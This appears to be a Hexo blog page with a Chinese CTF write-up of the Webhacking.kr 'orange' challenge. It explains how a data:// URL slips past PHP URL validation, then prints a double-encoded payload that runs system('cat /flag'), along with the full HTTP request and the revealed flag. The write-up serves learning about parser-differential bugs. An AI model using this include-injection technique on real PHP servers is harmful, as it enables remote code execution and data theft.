@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#ff3e3e" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#ff3e3e" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#ff3e3e">
+  <meta name="google-site-verification" content="ixJcuHIxOAn36hBu980PgJYFR9hLoktNwfEAAimupCI">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=Italianno:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=JetBrains+Mono:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":true,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="分析 PHP URL 校验与 data stream wrapper 的解析差异，说明 Webhacking.kr orange 中的文件包含、百分号编码与后缀处理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webhacking.kr orange">
+<meta property="og:url" content="https://vkkkv.github.io/wp/webhacking/orange/">
+<meta property="og:site_name" content="Hello Navi">
+<meta property="og:description" content="分析 PHP URL 校验与 data stream wrapper 的解析差异，说明 Webhacking.kr orange 中的文件包含、百分号编码与后缀处理。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-10-06T07:12:16.000Z">
+<meta property="article:modified_time" content="2026-10-06T07:12:16.000Z">
+<meta property="article:author" content="vkkkv">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="rfi">
+<meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://vkkkv.github.io/wp/webhacking/orange/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://vkkkv.github.io/wp/webhacking/orange/","path":"wp/webhacking/orange/","title":"Webhacking.kr orange"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Webhacking.kr orange | Hello Navi</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2L68NKWCGZ"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2L68NKWCGZ","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="/js/third-party/analytics/google-analytics.js" defer></script>
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/pangu@7.2.1/dist/browser/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.5.0/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@11.10.1/dist/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+  <script class="next-config" data-name="wavedrom" type="application/json">{"enable":true,"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.6.2/wavedrom.min.js","integrity":"sha256-3hPWxTqi1K1sjmlESiOTH6lfGwYmz8/SFqoAcPxrjwg="}}</script>
+  <script class="next-config" data-name="wavedrom_skin" type="application/json">{"enable":true,"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.6.2/skins/default.js","integrity":"sha256-bUKjUpel+qLgflZd3EfdbhIorwRYgSkaZKM2s/Bi0VI="}}</script>
+  <script src="/js/third-party/tags/wavedrom.js" defer></script>
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","display_overflow":"scroll","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha256-44BednzIpUeQJcY8qtLyarFu0UCCTbgmWOvaoehiFQQ=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://vkkkv.github.io/wp/webhacking/orange/"}</script>
+  <script src="/js/third-party/quicklink.js" defer></script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="icon" type="image/svg+xml" sizes="any" href="/images/favicon.svg">
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><link rel="alternate" href="/atom.xml" title="Hello Navi" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hello Navi" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hello Navi</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Tech, Security & Personal Notes</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#analysis"><span class="nav-number">2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">3.</span> <span class="nav-text">Solution</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="vkkkv"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">vkkkv</p>
+  <div class="site-description" itemprop="description">A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">539</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">355</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/VKKKV" title="github → https:&#x2F;&#x2F;github.com&#x2F;VKKKV" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/orange/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Webhacking.kr orange | Hello Navi">
+      <meta itemprop="description" content="分析 PHP URL 校验与 data stream wrapper 的解析差异，说明 Webhacking.kr orange 中的文件包含、百分号编码与后缀处理。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Webhacking.kr orange
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-10-06 15:12:16" itemprop="dateCreated datePublished" datetime="2026-10-06T15:12:16+08:00">2026-10-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>831</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>3 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">分析 PHP URL 校验与 data stream wrapper 的解析差异，说明 Webhacking.kr orange 中的文件包含、百分号编码与后缀处理。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>The page takes a <code>url</code> parameter, appends
+<code>.txt</code>, and includes it after a stack of URL checks.</p>
+<p>页面接收 <code>url</code> 参数，追加 <code>.txt</code> 后经过一串 URL
+校验再 <code>include</code>。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://webhacking.kr:10009/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>?view_source=1</code> 直接给出源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_source&#x27;</span>])&#123; <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_version&#x27;</span>])&#123; <span class="keyword">echo</span> <span class="title function_ invoke__">phpversion</span>(); <span class="keyword">exit</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ls&#x27;</span>])&#123; <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -a&quot;</span>); <span class="keyword">exit</span>; &#125; <span class="comment">// to prove for about there is not hidden files in this directory. you dont have to run dirbuster!</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>].<span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL)) <span class="keyword">exit</span>(<span class="string">&quot;invalid url&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:\/\/webhacking.kr:10009\//&quot;</span>,<span class="variable">$url</span>)) <span class="keyword">exit</span>(<span class="string">&quot;invalid server&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/@|#|\(|\)|\\$|`|&#x27;|\&quot;|_|&#123;|&#125;|\?/&quot;</span>,<span class="variable">$url</span>)) <span class="keyword">exit</span>(<span class="string">&quot;you are not orange&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>)[<span class="string">&#x27;host&#x27;</span>] !== <span class="string">&quot;webhacking.kr&quot;</span>) || (<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>)[<span class="string">&#x27;port&#x27;</span>] !== <span class="number">10009</span>)) <span class="keyword">exit</span>(<span class="string">&quot;invalid host or port&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>)[<span class="string">&#x27;user&#x27;</span>] || <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>)[<span class="string">&#x27;pass&#x27;</span>]) <span class="keyword">exit</span>(<span class="string">&quot;you are not orange&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$url</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&lt;a href=./?url=http://webhacking.kr:10009/cat&gt;cat&lt;/a&gt; &lt;a href=./?url=http://webhacking.kr:10009/dog&gt;dog&lt;/a&gt; &lt;hr&gt;&lt;a href=./?view_source=1&gt;view-source&lt;/a&gt; &lt;a href=./?view_version=1&gt;view-version&lt;/a&gt; &lt;a href=./?ls=1&gt;ls&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>页面提供 PHP 版本和目录清单；直接访问 <code>.txt</code> 文件会返回
+PHP 源码，通过 <code>url</code> 参数包含同一文件则会执行其中的代码：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?view_version=1  -&gt; 7.3.8-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">?ls=1            -&gt; .  ..  cat.txt  dog.txt  index.php</span><br><span class="line">/cat.txt         -&gt; &lt;?php echo &quot;meow meow&quot;; ?&gt;</span><br><span class="line">/dog.txt         -&gt; &lt;?php echo &quot;bow wow&quot;; ?&gt;</span><br><span class="line">?url=http://webhacking.kr:10009/cat  -&gt; meow meow</span><br></pre></td></tr></table></figure>
+<p><code>meow meow</code> 的回显说明 HTTP stream 可以被
+<code>include</code>，即题目环境允许 URL inclusion。校验作用于追加
+<code>.txt</code> 后的 <code>$url</code>：</p>
+<ul>
+<li><code>filter_var(..., FILTER_VALIDATE_URL)</code> 检查 URL
+格式。</li>
+<li>第一条正则要求匹配
+<code>http://webhacking.kr:10009/</code>，没有锚定字符串开头。</li>
+<li>第二条正则禁用
+<code>@</code>、<code>#</code>、括号、<code>$</code>、反引号、单双引号、<code>_</code>、花括号和
+<code>?</code>。</li>
+<li><code>parse_url()</code> 要求 host 为
+<code>webhacking.kr</code>、port 为 <code>10009</code>，且不含
+user/pass。</li>
+</ul>
+<p>这些检查没有限制 scheme。将 <code>http://webhacking.kr:10009/</code>
+放入 path 仍能满足正则，前面的 authority 则用于通过
+<code>parse_url()</code> 检查。最终 <code>include</code> 使用哪个 stream
+wrapper，由 scheme 决定。</p>
+<h3 id="solution">Solution</h3>
+<p>RFC 2397 定义的 data URL 形式为
+<code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code>。PHP 支持
+<code>data://</code> 写法，并接受下面这个包含伪装 authority 的输入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://webhacking.kr:10009/http://webhacking.kr:10009/,HELLO</span><br></pre></td></tr></table></figure>
+<p>追加 <code>.txt</code> 后，<code>filter_var</code> 接受该
+URL，第一条正则命中 path 内的 HTTP
+URL，黑名单没有命中。<code>parse_url()</code> 将其解析为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scheme = data</span><br><span class="line">host   = webhacking.kr</span><br><span class="line">port   = 10009</span><br><span class="line">path   = /http://webhacking.kr:10009/,HELLO.txt</span><br></pre></td></tr></table></figure>
+<p><code>data://</code> wrapper
+将逗号前的部分作为媒体类型信息处理，从逗号后的 data 读取内容，不会向上述
+host 发起 HTTP 请求。此时 <code>.txt</code> 已经追加到 data 末尾，所以
+<code>include</code> 读取并输出 <code>HELLO.txt</code>。这里利用的是
+<code>parse_url()</code> 与 stream wrapper
+对同一字符串的不同解释；伪装的 authority 并非 RFC 2397
+定义的网络地址。</p>
+<p>未使用 <code>;base64</code> 时，wrapper 会对 data 做一次 URL 解码。将
+PHP 代码中的禁用字符写为百分号编码，校验阶段便只会看到
+<code>%28</code>、<code>%29</code>、<code>%27</code>、<code>%3F</code>
+等文本。请求 query 还会先经过一次解码，因此其中的 <code>%</code>
+必须再编码为 <code>%25</code>：<code>%2528</code> →
+<code>$_GET['url']</code> 中的 <code>%28</code> → wrapper 内容中的
+<code>(</code>。</p>
+<p>完整 payload 在各阶段的值：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;url&#x27;] = data://webhacking.kr:10009/http://webhacking.kr:10009/,%3C%3Fphp%20system%28%27cat%20/flag%27%29%3B%3F%3E</span><br><span class="line">$url         = $_GET[&#x27;url&#x27;] . &quot;.txt&quot;</span><br><span class="line">data 解码后   = &lt;?php system(&#x27;cat /flag&#x27;);?&gt;.txt</span><br></pre></td></tr></table></figure>
+<p>请求（query 里的 <code>%</code> 再编一次，即 <code>%3C</code> →
+<code>%253C</code>）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=data%3A%2F%2Fwebhacking.kr%3A10009%2Fhttp%3A%2F%2Fwebhacking.kr%3A10009%2F%2C%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag%2527%2529%253B%253F%253E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>webhacking.kr:10009</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;*****************&#125;</span><br><span class="line">.txt</span><br></pre></td></tr></table></figure>
+<p><code>include</code> 执行解码后的
+<code>&lt;?php system('cat /flag');?&gt;</code>，读取
+<code>/flag</code>。闭合标签 <code>?&gt;</code> 使后缀 <code>.txt</code>
+位于 PHP 代码之外，作为普通文本输出，因此无需截断后缀。该链依赖
+<code>allow_url_fopen</code> 和 <code>allow_url_include</code>
+开启，以及 <code>system()</code> 可用。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">FLAG{hardcore_from_7.1}</span></span>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>vkkkv
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://vkkkv.github.io/wp/webhacking/orange/" title="Webhacking.kr orange">https://vkkkv.github.io/wp/webhacking/orange/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+              <a href="/tags/ssrf/" rel="tag"><i class="fa fa-tag"></i> ssrf</a>
+              <a href="/tags/rfi/" rel="tag"><i class="fa fa-tag"></i> rfi</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/wp/webhacking/child-toctou/" rel="prev" title="Webhacking.kr child toctou">
+                  <i class="fa fa-angle-left"></i> Webhacking.kr child toctou
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">vkkkv</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">NaNm</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">NaN:aN</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
